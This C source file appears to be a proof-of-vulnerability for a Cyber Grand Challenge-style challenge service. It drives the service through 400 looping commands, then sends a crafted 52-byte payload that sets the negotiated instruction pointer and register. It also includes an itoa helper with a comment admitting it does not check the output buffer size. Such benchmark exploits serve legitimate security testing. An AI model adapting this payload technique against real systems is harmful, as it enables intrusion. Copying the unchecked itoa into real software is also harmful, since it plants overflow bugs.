#include <libpov.h>
#include <string.h>

// STOLEN FROM CROMU sample
// itoa - Does not check output buffer size.
// Can potentially write up to 12 characters ("-2147483648\0") to str.
void itoa(char *str, int i)
{
    char buffer[11];
    int pos = 0;
    int outpos = 0;
    int neg = 0;
    if (i < 0)
    {
        neg = 1;
        i = -i;
    }
    do
    {
        buffer[pos++] = '0' + i % 10;
        i /= 10;
    } while (i > 0);

    if (neg == 1)
    {
        buffer[pos++] = '-';
    }
    if (str == NULL)
    {
        return;
    }

    while(outpos < pos)
    {
        str[outpos] = buffer[pos - outpos - 1];
        outpos ++;
    }
    str[outpos] = '\0';
}

int main(void)
{
    char buf[128];
    unsigned char *line;
    unsigned int linesize, i;
    size_t bytes;
    type1_vals t1;
    type1_negotiate(0xfefefefe, 0xfefefefe, 5, &t1);
    t1.ipval |= 0x01010101;
    t1.regval |= 0x01010101;

    transmit_all(STDOUT, "7890\x00\xc0\x47\x43", 8);

    for (i = 0; i < 400; i++)
    {
        int j;
        for (j = 0; j < 23; j++)
        {
            line = NULL;
            delimited_read(STDIN, &line, &linesize, (unsigned char *)NL, 1);
        }
        buf[0] = 'q';
        buf[1] = NL[0];
        itoa(&buf[2], i);
        buf[strlen(buf)] = NL[0];
        buf[strlen(buf)] = '\0';
        transmit_all(STDOUT, buf, strlen(buf));
    }

    memcpy(buf, "XX\x02""512 aaaabbbbxxxxxxxxxxxxxxxx\x21\x00\x04\x00\x3c\xa8\xaa\xba\x3c\x00\xc0\xb7\x02""512\x02""111\x02", 52);
    *(unsigned int *)&buf[7] = t1.regval;
    *(unsigned int *)&buf[11] = t1.ipval;
    random(&buf[0], 2, &bytes);
    random(&buf[15], 16, &bytes);
    for (i = 0; i < 16; i++)
        buf[15 + i] |= 1;
    (void)bytes;
    transmit_all(STDOUT, buf, 52);
    return 0;
}
